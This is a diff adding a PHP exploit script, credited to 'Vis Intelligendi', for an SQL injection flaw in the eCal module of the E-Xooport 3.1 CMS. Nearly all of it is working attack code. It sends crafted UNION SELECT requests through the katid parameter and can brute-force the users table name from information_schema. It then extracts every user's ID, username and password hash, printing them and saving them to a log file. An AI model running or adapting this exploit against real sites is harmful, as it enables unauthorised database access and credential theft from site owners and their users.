@@ -1,0 +1,149 @@
+<?
+/* 			Vis Intelligendi
+		http.//vis-intelligendi.co.cc
+	E-Xooport 3.1 SQL Injection Exploit 01 (Mq on/off doesn't matter)
+	bug details and explanation on http://vis-intelligendi.co.cc (search e-xooport)
+
+	E-Xoops is a xoops-based cms. Many modules are bugged, in this case "eCal", no need of quoting code for this advisory.
+	This script will first brute users' table name (if you want) and second will extract all users data from the db 
+	(or only one user, if you specify the ID)	
+	
+
+usage php exopoort_exploit.php host path [uid]
+
+!! TESTED !! WE DON'T SUBMIT EXPLOITS WITHOUT VERIFYING THEM
+
+
+/* GENERAL CONFIGURATION */
+$table = "e_xoops_users";  #  THIS MAYBE CHANGES FROM SITE TO SITE, usually users,e_xoops_users, sam_users
+$brute_table = FALSE; # IF THE EXPLOIT DOES not work first time, probably the reason is the table name, so set this to TRUE and the exploit will brute the table name if mysql version >= 5
+					  # this may take some minutes..
+/* EXPLOIT */			  
+error_reporting(0);
+ini_set("default_socket_timeout",30);
+set_time_limit(0);
+function http_send($host, $packet)
+{
+
+		$sock = fsockopen($host, 80); $c = 0;
+		while (!$sock)
+		{
+			if ($c++ == 10) die();
+			print "\n[-] No response from ".$host.":80 Trying again...";
+			$sock = fsockopen($host,80);
+			sleep(1);
+		}
+		fputs($sock, $packet);
+		$resp = "";
+		while (!feof($sock)) $resp .= fread($sock, 1);
+		fclose($sock);
+		return $resp;
+
+}
+function getContent($resp) {
+		
+   		$data = explode("\r\n\r\n", $resp);
+   		$content="";
+	
+		for ($i=1; $i<count($data); $i++)
+	    	$content .= $data[$i];
+		return $content;
+
+}
+function makePacket($page, $sql, $host) {
+
+	$packet = "GET ".$page.$sql." HTTP/1.1\r\n";
+	$packet .= "Host: ".$host."\r\n";
+	$packet .= "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.8) Gecko/20071008 Firefox/2.0.0.8\r\n";
+	$packet .= "Accept-Language: it-it,it;q=0.8,en-us;q=0.5,en;q=0.3\r\n";
+	$packet .= "Connection: close\r\n\r\n";
+	return $packet;
+
+	}
+	
+$s = "0x5649535f494e54454c4c4947454e4449";
+$string = "VIS_INTELLIGENDI";
+
+echo <<<SPLASH
+---------------------------------------------------------------------
+	Vis Intelligendi
+http://vis-intelligendi.co.cc
+
+E-Xooport SQL Injection 01 (katid)
+-User,pass,uid extraction exploit
+
+usage:
+	php exploit.php host path [user_id]*
+	
+	php exploit.php www.site.com /exooport/ 1		{without /modules/ dir}
+	php exploit.php www.e-xoopport.it /
+	
+* If not specified, the exploit will extract all users from the database.
+---------------------------------------------------------------------
+
+SPLASH;
+	
+	$host = $argv[1];
+	$path = $argv[2];
+	$uid = $argv[3];
+	$users = "";
+	if ($host && $path) {
+	 $path .= "modules/eCal/display.php?katid=";
+	 
+		if ($brute_table) {
+		 
+		 	print "Table brute set ON. Trying to find the table.. this may take some minutes (note: works only with information_schema viewable)\n";
+		 	$sql = "-1+union+select+concat($s,table_name,0x3a,$s),0+from+information_schema.tables+limit+[N],1";
+		 	$k = 0;
+		 	$reg = array();
+		 	$tables = array();
+			$ex = str_replace("[N]", $k, $sql);
+		 	$txt = getContent(http_send($host,makePacket($path,$ex,$host)));
+		 	$regx = "$string(.+)\:$string";
+			while(ereg($regx,$txt,$reg)) {
+			 	$k++;
+				$tables[] = $reg[1];
+				print $reg[1]."\n";
+				$regz = array();
+				if (eregi("(.+)users$",$reg[1],$regz)) {
+					$table = $reg[1];
+				}
+				$ex = str_replace("[N]", $k, $sql);
+		 		$txt = getContent(http_send($host,makePacket($path,$ex,$host)));
+			}
+		}
+	
+		print "\n\n [] Table = $table\n\n";
+		if (!$uid) {
+		$sql = "-1+union+select+concat($s,uid,0x3a,uname,0x3a,pass,$s),0+from+$table+limit+[N],1";
+		} else {
+			$sql = "-1+union+select+concat($s,uid,0x3a,uname,0x3a,pass,$s),0+from+$table+where+uid=$uid+limit+[N],1";
+		}
+		$regs = array();
+		$regex = $string."(.+)".$string;
+		$n = 0;
+		$ex = str_replace("[N]", $n, $sql);
+		$pck = makePacket($path,$ex,$host);
+		$resp = http_send($host,$pck);
+		$txt = getContent($resp);
+		while(ereg($regex,$txt,$regs)) {
+			$users .= $regs[1]."\n";
+			print $regs[1]."\n";
+			$n++;
+			$pck = makePacket($path,str_replace("[N]",$n,$sql),$host);
+			$resp = http_send($host,$pck);
+			$txt = getContent($resp);
+		}
+	$write = 	"\n\nVis Intelligendi".
+				"\n E-Xooport 3.1 SQL Injection Exploit\n".
+				"http://vis-intelligendi.co.cc\n".
+				"Host : $host\n".
+				"Path : $path\n".
+				"http://$host$path$sql\n\n".
+				"table: $table\n\n".$users."\n\n Vis Intelligendi Magia";
+				
+					fwrite(fopen("exooport_log.txt","w+"),$write);
+	print "Check exooport_log.txt";
+	}
+	
+	?>
